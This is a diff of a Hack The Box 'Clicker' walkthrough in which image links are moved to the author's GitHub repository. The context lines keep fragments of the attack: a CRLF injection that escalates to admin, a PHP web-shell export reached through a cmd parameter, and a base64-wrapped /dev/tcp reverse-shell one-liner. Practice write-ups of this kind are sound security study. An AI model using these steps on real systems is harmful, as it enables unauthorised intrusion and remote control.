@@ -9,7 +9,7 @@ tags: ghidra burpsuite webapp php web-shell perl nmap reverse-engineering
 
 # Resolution of Clicker Machine of Hack The Box
 
-![https://i.ibb.co/CH0BhMY/clicker-htb-home.webp](https://i.ibb.co/85JCnVR/Clicker.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/Clicker.webp)
 
 ### 🔬 *"Cool Hacking always have Reverse Engineering..."*
 
@@ -36,7 +36,7 @@ sudo nmap 10.10.11.232 -p 22,80,111,2049,37783,40073,43029,51063,56481 -sS -Pn -
 - In our web browser, Firefox, I will redirecting all **HTTP** traffic through a proxy to localhost (via IPv4) on port 8080 (127.0.0.1:8080). This will be useful to intercept and view all the traffic in Burp Suite. *(Note: In my case, I use Foxy Proxy extension to redirect HTTP traffic through localhost)*.
 
 
-![https://i.ibb.co/CH0BhMY/clicker-htb-home.webp](https://i.ibb.co/CH0BhMY/clicker-htb-home.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/clicker-htb-home.webp)
 
 - Let's register as **normal-user** and then log in. 
 - If we still looking for some in this website probably we can't found nothing.
@@ -127,11 +127,11 @@ if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
 
 - So we can add the **parameter** `role` to try bypass our *normal-user role* to `Admin`.
 
-![https://i.ibb.co/T20BTC8/burp-suite-crlf.webp](https://i.ibb.co/T20BTC8/burp-suite-crlf.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/burp-suite-crlf.webp)
 
 - Picture zoom:
 
-![https://i.ibb.co/zZ3RxTm/burp-suite-crlf-zoom.webp](https://i.ibb.co/zZ3RxTm/burp-suite-crlf-zoom.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/burp-suite-crlf-zoom.webp)
 
 - CRLF Injection Payload:
 
@@ -159,14 +159,14 @@ Upgrade-Insecure-Requests: 1
 - Also we added a new parameter to manipulate the application and can give to us access as Administrator (`&role=Admin`).
 - Now we just need logout and login again to server can **reload** our **Role**:
 
-![https://i.ibb.co/fq2B44c/clicker-htb-administration.webp](https://i.ibb.co/fq2B44c/clicker-htb-administration.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/clicker-htb-administration.webp)
 
 - So we are **Administrators** on this web app, let's take a look...
 - From Burp Suite we can see that it is possible export "**results**" also as **PHP** file, because it works
 
-![https://i.ibb.co/pXwWmmG/burp-suite-export-php.webp](https://i.ibb.co/pXwWmmG/burp-suite-export-php.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/burp-suite-export-php.webp)
 
-![https://i.ibb.co/zRBrJ71/export-php.webp](https://i.ibb.co/zRBrJ71/export-php.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/export-php.webp)
 
 >   *Pentester Mindset*: "Server is running **PHP** and we can also export a file in **PHP** **filetype**, so: ¿Why not try to create a *PHP backdoor*? ¿Which code we need to?"
 
@@ -292,7 +292,7 @@ threshold=1000000&extension=php
 
 - Now we need to access to: `http://clicker.htb/exports/top_players_lruwllg1.php?cmd=id` where we can execute our commands:
 
-![https://i.ibb.co/j3wy803/clicker-htb-backdoor.webp](https://i.ibb.co/j3wy803/clicker-htb-backdoor.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/clicker-htb-backdoor.webp)
 
 - It's time to create a **Reverse Shell**:
 
@@ -314,7 +314,7 @@ echo "sh -i >& /dev/tcp/{IP}/{PORT} 0>&1" | base64 | base64 -d | bash
 
 **YES!!** we are inside the server.
 
-![https://i.ibb.co/T2hC1Bt/netcat.webp](https://i.ibb.co/T2hC1Bt/netcat.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/netcat.webp)
 
 ### Post Exploitation
 
@@ -341,7 +341,7 @@ www-data@clicker:/opt/manage$ cp execute_query /var/www/clicker.htb/exports
 
 ### Ghidra
 
-![https://i.ibb.co/n1w645L/ghidra.webp](https://i.ibb.co/n1w645L/ghidra.webp)
+![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/clicker.htb/ghidra.webp)
 
 
 ```cpp
